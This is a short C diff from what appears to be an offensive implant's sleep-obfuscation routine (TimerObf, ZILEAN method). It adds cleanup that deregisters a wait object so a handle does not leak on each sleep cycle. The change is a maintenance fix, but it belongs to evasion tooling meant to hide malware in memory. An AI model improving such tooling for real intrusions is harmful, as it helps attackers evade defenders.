@@ -614,6 +614,13 @@ BOOL TimerObf(
     }
 
 LEAVE: /* cleanup */
+    /* ZILEAN wait objects are not owned by a timer queue: deregister
+     * them explicitly, otherwise they leak every sleep cycle */
+    if ( Method == SLEEPOBF_ZILEAN && Timer ) {
+        Instance->Win32.RtlDeregisterWait( Timer );
+        Timer = NULL;
+    }
+
     if ( Queue ) {
         Instance->Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
